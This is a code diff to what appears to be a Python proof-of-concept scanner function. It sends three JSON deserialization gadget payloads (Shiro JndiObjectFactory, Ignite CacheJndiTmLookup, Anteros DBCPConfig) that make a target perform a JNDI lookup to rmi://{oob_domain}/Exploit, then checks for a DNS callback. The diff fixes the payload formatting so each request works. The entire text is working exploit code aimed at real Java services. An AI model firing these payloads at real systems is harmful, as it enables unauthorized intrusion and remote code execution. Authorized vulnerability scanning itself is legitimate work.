@@ -42,30 +42,30 @@ def poc(url):
 
         path = """/"""
         method = "POST"
-        data = """{
-   "@type":"org.apache.shiro.jndi.JndiObjectFactory",
-   "resourceName":"rmi://{oob_domain}/Exploit"
-}"""
+        data = {
+            "@type":"org.apache.shiro.jndi.JndiObjectFactory",
+            "resourceName":"rmi://{oob_domain}/Exploit".format(oob_domain=oob_domain)
+        }
         headers = {'Content-Type': 'application/json'}
-        resp0 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)
+        resp0 = requests.request(method=method,url=url+path,json=data,headers=headers,timeout=10,verify=False,allow_redirects=False)
 
         path = """/"""
         method = "POST"
-        data = """{
-   "@type":"org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup",
-   "jndiNames":"rmi://{oob_domain}/Exploit"
-}"""
+        data = {
+            "@type":"org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup",
+            "jndiNames":"rmi://{oob_domain}/Exploit".format(oob_domain=oob_domain)
+        }
         headers = {'Content-Type': 'application/json'}
-        resp1 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)
+        resp1 = requests.request(method=method,url=url+path,json=data,headers=headers,timeout=10,verify=False,allow_redirects=False)
 
         path = """/"""
         method = "POST"
-        data = """{
-   "@type":"br.com.anteros.dbcp.AnterosDBCPConfig",
-   "metricRegistry":"rmi://{oob_domain}/Exploit"
-}""".format(oob_domain=oob_domain)
+        data = {
+            "@type":"br.com.anteros.dbcp.AnterosDBCPConfig",
+            "metricRegistry":"rmi://{oob_domain}/Exploit".format(oob_domain=oob_domain)
+        }
         headers = {'Content-Type': 'application/json'}
-        resp2 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)
+        resp2 = requests.request(method=method,url=url+path,json=data,headers=headers,timeout=10,verify=False,allow_redirects=False)
 
         if verify_request(type="dns", flag=flag):
             result["success"] = True
